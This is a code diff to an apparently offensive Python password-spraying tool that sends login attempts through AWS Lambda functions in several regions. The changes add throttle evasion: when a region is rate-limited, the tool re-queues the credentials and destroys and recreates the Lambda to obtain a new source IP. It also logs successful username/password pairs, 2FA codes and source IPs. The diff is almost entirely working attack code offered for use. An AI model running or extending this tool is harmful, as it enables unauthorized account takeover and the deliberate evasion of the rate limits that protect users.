@@ -75,9 +75,9 @@ def main(args,pargs):
 				access_key=access_key,
 				secret_access_key=secret_access_key,
 				arn=arn,
-				args=pluginargs
+				args=pluginargs,
+				zip_path=zip_path
 			)
-
 
 	# Capture duration
 	end_time = datetime.datetime.utcnow()
@@ -107,7 +107,7 @@ def display_stats(start=True):
 		log_entry('Total Execution: {} seconds'.format(time_lapse))
 
 
-def start_spray(access_key, secret_access_key, arn, args):
+def start_spray(access_key, secret_access_key, arn, args, zip_path):
 	while not q.empty():
 		item = q.get_nowait()
 
@@ -121,6 +121,7 @@ def start_spray(access_key, secret_access_key, arn, args):
 			secret_access_key=secret_access_key,
 			arn=arn,
 			payload=payload,
+			zip_path=zip_path
 		)
 
 		q.task_done()
@@ -202,7 +203,7 @@ def load_lambdas(access_key, secret_access_key, thread_count, zip_path):
 					zip_path=zip_path,
 					access_key=access_key,
 					secret_access_key=secret_access_key,
-					region_idx=x,
+					region_idx=x
 				)
 			)
 	return [x.result() for x in arns]
@@ -328,7 +329,7 @@ def create_lambda(access_key, secret_access_key, zip_path, region_idx):
 		except:
 			client = init_client('iam', access_key, secret_access_key, region)
 			role_name = client.get_role(RoleName="CredKing_Role")
-			
+
 		client = init_client('lambda', access_key, secret_access_key, region)
 		response = client.create_function(
 				Code={
@@ -355,7 +356,7 @@ def create_lambda(access_key, secret_access_key, zip_path, region_idx):
 		return None
 
 
-def invoke_lambda(access_key, secret_access_key, arn, payload):
+def invoke_lambda(access_key, secret_access_key, arn, payload, zip_path):
 	lambdas = []
 	arn_parts = arn.split(':')
 	region, func = arn_parts[3], arn_parts[-1]
@@ -372,13 +373,35 @@ def invoke_lambda(access_key, secret_access_key, arn, payload):
 	return_payload = json.loads(response['Payload'].read().decode("utf-8"))
 	user, password = return_payload['username'], return_payload['password']
 	code_2fa = return_payload['code']
+	ip = return_payload['sourceip']
 
-	if return_payload['success'] == True:
-		clear_credentials(user, password)
+	import random
+	if return_payload['throttled'] == True:
 
-		log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
+		log_entry("THROTTLE DETECTED IN REGION {}: destroying current lambda & creating with new request IP".format(region))
+
+		#re-queue the credentials so they are tested in a non-throtled location
+		cred = {}
+		cred['username'] = user
+		cred['password'] = password
+		cred['useragent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+		q.put(cred)
+
+		# then destroy/regen the throttled lambda
+		clean_up_lambda(region, lambda_clients[region])
+		# create a new lambda, should have a new IP
+		# annoyingly backwards, but didn't want to just add another function argument & change function logic
+		region_idx = regions.index(region)
+		create_lambda(access_key, secret_access_key, zip_path, region_idx)
+
 	else:
-		log_entry('(FAILED) Code: {} : {} / {} -> Failed.'.format(code_2fa, user, password))
+
+		if return_payload['success'] == True:
+			clear_credentials(user, password)
+
+			log_entry('(SUCCESS) Region: {} : Source IP: {} : {} / {} -> Success! (2FA: {})'.format(region, ip, user, password, code_2fa))
+		else:
+			log_entry('(FAILED) Region: {} : Code: {} : Source IP: {} : {} / {} -> Failed.'.format(region, code_2fa, ip, user, password))
 
 
 def log_entry(entry):
@@ -392,31 +415,35 @@ def clean_up(access_key, secret_access_key, only_lambdas=True):
 		client.delete_role(RoleName='CredKing_Role')
 
 	for client_name, client in lambda_clients.items():
-		log_entry('Cleaning up lambdas in {}...'.format(client.meta.region_name))
-
-		try:
-			lambdas_functions = client.list_functions(
-				FunctionVersion='ALL',
-				MaxItems=1000
-			)
-
-			if lambdas_functions:
-				for lambda_function in lambdas_functions['Functions']:
-					if not '$LATEST' in lambda_function['FunctionArn']:
-						lambda_name = lambda_function['FunctionName']
-						arn = lambda_function['FunctionArn']
-						try:
-							log_entry('Destroying {} in region: {}'.format(arn, client.meta.region_name))
-							client.delete_function(FunctionName=lambda_name)
-						except:
-							log_entry('Failed to clean-up {} using client region {}'.format(arn, region))
-		except:
-			log_entry('Failed to connect to client region {}'.format(region))
+		clean_up_lambda(client_name,client)
 
 	filelist = [ f for f in os.listdir('build') if f.endswith(".zip") ]
 	for f in filelist:
 		os.remove(os.path.join('build', f))
 
+
+def clean_up_lambda(client_name,client):
+
+	log_entry('Cleaning up lambdas in {}...'.format(client.meta.region_name))
+
+	try:
+		lambdas_functions = client.list_functions(
+			FunctionVersion='ALL',
+			MaxItems=1000
+		)
+
+		if lambdas_functions:
+			for lambda_function in lambdas_functions['Functions']:
+				if not '$LATEST' in lambda_function['FunctionArn']:
+					lambda_name = lambda_function['FunctionName']
+					arn = lambda_function['FunctionArn']
+					try:
+						log_entry('Destroying {} in region: {}'.format(arn, client.meta.region_name))
+						client.delete_function(FunctionName=lambda_name)
+					except:
+						log_entry('Failed to clean-up {} using client region {}'.format(arn, region))
+	except:
+		log_entry('Failed to connect to client region {}'.format(region))
 
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser()
